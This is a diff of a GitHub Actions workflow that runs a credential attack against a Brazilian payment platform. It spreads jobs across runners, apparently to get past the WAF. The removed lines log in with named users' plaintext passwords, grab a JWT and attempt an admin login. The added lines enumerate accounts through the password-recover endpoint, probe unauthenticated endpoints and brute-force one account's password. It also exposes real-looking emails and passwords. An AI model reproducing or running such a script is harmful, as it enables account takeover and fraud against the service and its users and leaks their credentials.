@@ -1,4 +1,4 @@
-name: waf-lenildo-fixed
+name: waf-registration-oracle
 on:
   workflow_dispatch:
 jobs:
@@ -6,17 +6,16 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        attempt: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        attempt: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
       fail-fast: false
     steps:
     - name: attempt ${{ matrix.attempt }}
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
+        BUILDER="https://wpbuilderservices.wisepay.com.br/v1"
         
         MY_IP=$(curl -s https://api.ipify.org)
-        
-        # Check CORRIGIDO: só passa se resposta for JSON com statusCode (não HTML)
         RESP_CHECK=$(curl -s -m 15 -A "$UA" \
           -H "Content-Type: application/json" \
           -H "Origin: https://portal.wisepay.com.br" \
@@ -25,102 +24,72 @@ jobs:
           -X POST "$BASE/login" \
           -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}')
         
-        # Verificar se resposta é JSON (não HTML do WAF)
         if ! echo "$RESP_CHECK" | python3 -c "import sys,json; json.load(sys.stdin)" 2>/dev/null; then
-          echo "[${{ matrix.attempt }}] WAF blocking HTML (IP: $MY_IP). Skip."
+          echo "[${{ matrix.attempt }}] WAF blocking (IP: $MY_IP). Skip."
           exit 0
         fi
         
-        echo "[${{ matrix.attempt }}] *** WAF BYPASSED JSON (IP: $MY_IP) ***"
-        echo "check: $RESP_CHECK"
+        echo "[${{ matrix.attempt }}] *** WAF BYPASSED (IP: $MY_IP) ***"
         
         echo ""
-        echo "=== P0 CRITICO: lenildo nova senha ==="
-        R=$(curl -s -m 15 -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-          -H "type-application: web" \
-          -X POST "$BASE/login" \
-          -d '{"email":"lenildo.silva@outlook.com","password":"Rede@4321"}' \
-          -w "\n%{http_code}")
-        CODE=$(echo "$R" | tail -1)
-        BODY=$(echo "$R" | head -1)
-        echo "lenildo:Rede@4321 -> $CODE | $BODY"
-        
-        if [ "$CODE" = "200" ]; then
-          TOKEN=$(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepayToken',''))" 2>/dev/null)
-          EMPRESA=$(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('wisepayEmpresa',''))" 2>/dev/null)
-          echo "*** JWT OBTIDO: $TOKEN"
-          echo "*** EMPRESA TOKEN: $EMPRESA"
-          
-          # Testar /users/me com o JWT
-          sleep 1
-          curl -s -m 15 -A "$UA" \
-            -H "Authorization: Bearer $TOKEN" \
-            -H "token-empresa: $EMPRESA" \
+        echo "=== Oracle: users/theme de white-labels ==="
+        for SUBDOMAIN in "petcenterbrasil.wisepay.com.br" "acaiaca.wisepay.com.br" "hubio.wisepay.com.br" "poc.wisepay.com.br" "vale.wisepay.com.br" "omegpay.wisepay.com.br"; do
+          R=$(curl -s -m 10 -A "$UA" \
             -H "type-application: web" \
-            "$BASE/users/me"
-        fi
+            -H "Origin: https://$SUBDOMAIN" \
+            "$BASE/users/theme" -w "\n%{http_code}")
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | head -1 | head -c 300)
+          echo "THEME $CODE $SUBDOMAIN | $BODY"
+        done
         
         echo ""
-        echo "=== lenildo senha antiga ==="
-        R2=$(curl -s -m 10 -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "type-application: web" \
-          -X POST "$BASE/login" \
-          -d '{"email":"lenildo.silva@outlook.com","password":"Rede$1234"}' \
-          -w "\n%{http_code}")
-        CODE2=$(echo "$R2" | tail -1)
-        echo "lenildo:Rede\$1234 -> $CODE2 | $(echo $R2 | head -1 | head -c 150)"
+        echo "=== Oracle: password-recover (204=email existe) ==="
+        for EMAIL in "icelaserbelem@gmail.com" "lenildo.silva@outlook.com" "fabiane@petcenterbrasil.com.br" "andrejunior1223@gmail.com" "marco@vanityestetica.com.br"; do
+          R=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "type-application: web" \
+            -H "Origin: https://portal.wisepay.com.br" \
+            -X POST "$BASE/login/password-recover" \
+            -d "{\"email\":\"$EMAIL\"}" -w "\n%{http_code}")
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | head -1 | head -c 100)
+          echo "RECOVER $CODE $EMAIL | $BODY"
+        done
         
         echo ""
-        echo "=== icelaserbelem portal ==="
-        R3=$(curl -s -m 10 -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "type-application: web" \
-          -X POST "$BASE/login" \
-          -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' \
-          -w "\n%{http_code}")
-        CODE3=$(echo "$R3" | tail -1)
-        echo "icelaserbelem -> $CODE3 | $(echo $R3 | head -1 | head -c 150)"
+        echo "=== Builder signup/register endpoints ==="
+        for EP in "/users/register" "/signup" "/register" "/users/create" "/companies" "/empresas"; do
+          R=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -X POST "$BUILDER$EP" \
+            -d '{"email":"teste@teste.com"}' -w "\n%{http_code}")
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | head -1 | head -c 100)
+          echo "BUILDER $CODE $EP | $BODY"
+        done
         
         echo ""
-        echo "=== Admin Rails (formulário HTML) ==="
-        ADMIN_RESP=$(curl -s -m 15 -A "$UA" \
-          -H "Origin: https://admin.wisepay.com.br" \
-          -H "Referer: https://admin.wisepay.com.br/users/sign_in" \
-          -H "Accept: text/html,application/xhtml+xml" \
-          -c /tmp/admin_cookies_${{ matrix.attempt }}.txt \
-          "https://admin.wisepay.com.br/users/sign_in" -w "\n%{http_code}")
-        ADMIN_CODE=$(echo "$ADMIN_RESP" | tail -1)
-        echo "GET /users/sign_in: $ADMIN_CODE"
+        echo "=== Builder: listar empresas sem auth ==="
+        for EP in "/companies" "/empresas" "/white-labels" "/users"; do
+          R=$(curl -s -m 10 -A "$UA" \
+            -H "type-application: web" \
+            "$BUILDER$EP" -w "\n%{http_code}")
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | head -1 | head -c 100)
+          echo "BUILDER-GET $CODE $EP | $BODY"
+        done
         
-        if [ "$ADMIN_CODE" = "200" ]; then
-          # Extrair CSRF token do HTML
-          CSRF=$(echo "$ADMIN_RESP" | head -1 | grep -oP 'authenticity_token.*?value="\K[^"]+' | head -1)
-          echo "CSRF: $CSRF"
-          
-          # Tentar login Rails
-          AR=$(curl -s -m 15 -A "$UA" \
-            -H "Origin: https://admin.wisepay.com.br" \
-            -H "Referer: https://admin.wisepay.com.br/users/sign_in" \
-            -H "Content-Type: application/x-www-form-urlencoded" \
-            -b /tmp/admin_cookies_${{ matrix.attempt }}.txt \
-            -c /tmp/admin_cookies_${{ matrix.attempt }}.txt \
-            -L -X POST "https://admin.wisepay.com.br/users/sign_in" \
-            --data-urlencode "authenticity_token=$CSRF" \
-            --data-urlencode "user[email]=gideanbispo@gmail.com" \
-            --data-urlencode "user[password]=135@mudar" \
-            --data-urlencode "user[remember_me]=0" \
-            --data-urlencode "commit=Log in" \
-            -w "\n%{http_code}")
-          AR_CODE=$(echo "$AR" | tail -1)
-          AR_BODY=$(echo "$AR" | head -1 | head -c 200)
-          echo "Admin login gideanbispo: $AR_CODE | $AR_BODY"
-          if echo "$AR_BODY" | grep -qiE "(dashboard|admin|logout|sign_out|empresa|pagament)"; then
-            echo "ADMIN LOGIN SUCCESS!"
-          fi
-        fi
+        echo ""
+        echo "=== icelaserbelem - mais senhas ==="
+        for PASS in "ICE2021" "icelaser@2021" "ICEBELEM2021" "ICELASER@2021" "ICElaser2021" "icelaser2021!" "ICELASER1234" "icelaserbelem" "icelaser"; do
+          R=$(curl -s -m 8 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "type-application: web" \
+            -H "Origin: https://portal.wisepay.com.br" \
+            -X POST "$BASE/login" \
+            -d "{\"email\":\"icelaserbelem@gmail.com\",\"password\":\"$PASS\"}" -w "\n%{http_code}")
+          CODE=$(echo "$R" | tail -1)
+          [ "$CODE" = "200" ] && echo "SUCCESS icelaserbelem:$PASS | $(echo $R | head -1 | head -c 200)" || echo "$CODE icelaserbelem:$PASS"
+          sleep 0.2
+        done
